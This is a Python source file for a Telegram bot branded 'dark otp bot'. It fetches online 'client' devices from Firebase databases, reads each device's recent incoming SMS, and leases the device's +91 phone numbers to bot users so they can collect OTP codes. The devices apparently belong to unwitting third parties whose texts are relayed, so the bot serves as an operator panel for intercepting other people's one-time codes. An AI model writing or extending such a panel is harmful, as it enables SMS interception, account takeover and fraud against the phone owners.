from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
import random, time, asyncio
import database as db
import firebase_utils as fbu
from utils.ui import sc, btn
from utils.helper import clear_user_lease, get_countries, get_servers_grouped
from states import S

user_router = Router()

def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("get number", "user:get_num", "📱"), btn("my numbers", "user:saved", "⭐")],
        [btn("otp history", "user:history", "📜"), btn("help/support", "user:support", "🆘")]
    ])

@user_router.message(CommandStart())
async def cmd_start(msg: Message):
    uid = msg.from_user.id
    d = db.load_data()
    clear_user_lease(uid)
    if str(uid) not in d["users"]:
        d["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "otp_history": [], "saved_numbers": {}}
        db.save_data(d)
    await msg.answer(f"👋 <b>{sc('welcome to dark otp bot')}</b>\n{sc('select an option below')}:", reply_markup=main_kb(), parse_mode="HTML")

@user_router.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery):
    clear_user_lease(cq.from_user.id)
    try: await cq.message.edit_text(f"👋 <b>{sc('main menu')}</b>", reply_markup=main_kb(), parse_mode="HTML")
    except: pass

@user_router.callback_query(F.data == "user:get_num")
async def user_get_num(cq: CallbackQuery):
    clear_user_lease(cq.from_user.id)
    d = db.load_data()
    countries = get_countries(d)
    if not countries: return await cq.answer("❌ No servers available.", show_alert=True)
    
    kb = [[btn(c, f"user:country:{c}", "🌍")] for c in countries]
    kb.append([btn("main menu", "user:home", "🏠")])
    await cq.message.edit_text(f"🌍 <b>{sc('select country')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("user:country:"))
async def user_country(cq: CallbackQuery):
    country = cq.data.split(":")[2]
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    if not servers: return await cq.answer("No servers in this country.")
    
    kb = []
    for i, srv in enumerate(servers):
        ping = await fbu.check_ping(srv[0]["url"], srv[0].get("auth"))
        kb.append([btn(f"server {i+1} ({ping})", f"user:server:{country}:{i}", "📁")])
    kb.append([btn("back", "user:get_num", "🔙")])
    await cq.message.edit_text(f"🌍 {country} - <b>{sc('servers')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("user:server:"))
async def user_server(cq: CallbackQuery):
    parts = cq.data.split(":")
    country, idx = parts[2], int(parts[3])
    uid = cq.from_user.id
    clear_user_lease(uid)
    
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    if idx >= len(servers): return await cq.answer("Server not found!")
    
    try: await cq.message.edit_text(f"🔄 {sc('fetching fresh number')}...", parse_mode="HTML")
    except: pass
    
    used = d.setdefault("used_devices", {}).setdefault(str(uid), {})
    now = int(time.time())
    
    # 🔥 FAST PARALLEL FETCHING (No Hanging)
    async def fetch_clients_data(fb):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        return fb, clients

    tasks = [fetch_clients_data(fb) for fb in servers[idx]]
    results = await asyncio.gather(*tasks)

    available, repeat, all_devs = [], [], []
    
    for fb_i, (fb, clients) in enumerate(results):
        if not clients: continue
        for dev_id, c in clients.items():
            if not isinstance(c, dict): continue
            is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)
            if is_online:
                all_devs.append((fb_i, fb, dev_id, c))
                last_used = used.get(dev_id, 0)
                if now - last_used > 86400: available.append((fb_i, fb, dev_id, c))
                elif now - last_used > 43200: repeat.append((fb_i, fb, dev_id, c))
    
    is_rep = False
    if available: fb_i, fb, dev_id, dev_data = random.choice(available)
    elif repeat: fb_i, fb, dev_id, dev_data = random.choice(repeat); is_rep = True
    elif all_devs: fb_i, fb, dev_id, dev_data = random.choice(all_devs); is_rep = True
    else: return await cq.answer("❌ No online lines in this server.", show_alert=True)
        
    used[dev_id] = now
    data = db.load_data()
    data["used_devices"][str(uid)] = used
    
    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=10", fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    last_id = int(msgs[0].get("id", 0)) if msgs else 0
    
    best_nums = fbu.extract_best_numbers(dev_data, msgs)
    base_label = fb.get("label", f"Base {fb_i+1}")
    
    data["user_leases"][str(uid)] = {
        "dev_id": dev_id, "fb_url": fb["url"], "base_idx": base_label, "numbers": [n for n, c in best_nums],
        "expire_at": int(time.time()) + 3600, "health": 10, "last_msg_id": last_id
    }
    db.save_data(data)
    
    rep_mark = " #" if is_rep else ""
    nums_text = ""
    kb_nums = []
    
    if best_nums:
        for n, c in best_nums:
            nums_text += f"📞 <code>+91{n}</code> | {base_label}\n"
            kb_nums.append([InlineKeyboardButton(text=f"📋 Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
    else:
        nums_text = f"⚠️ <b>{sc('sim active. otp aate hi number update hoga')}.</b>"
        
    battery = str(dev_data.get("battery", "100")).replace("%", "")
    if not battery or battery == "?": battery = "100"
    
    text = (
        f"📱 <b>{sc('number details')}</b>\n"
        f"🔥 {sc('server')}: {idx+1} | {base_label}\n"
        f"🆔 {sc('rent id')}: <code>{dev_id}</code>{rep_mark}\n"
        f"⚙️ {sc('code')}: <code>{battery}T</code>\n"
        f"❤️ {sc('health')}: <b>10/10</b>\n\n"
        f"{nums_text}\n"
        f"⌛ <i>{sc('waiting for otp (1 hour)')}...</i>"
    )
    
    kb = kb_nums + [
        [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
        [btn("info", f"user:info:{dev_id}", "ℹ️"), btn("save number", f"user:save:{dev_id}", "⭐")],
        [btn("next number", f"user:server:{country}:{idx}", "🔄"), btn("stop", "user:stop", "⏹")],
        [btn("back", f"user:country:{country}", "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

# ... (user_info, user_save, user_saved_list, user_access, user_stop, user_history same rahenge) ...
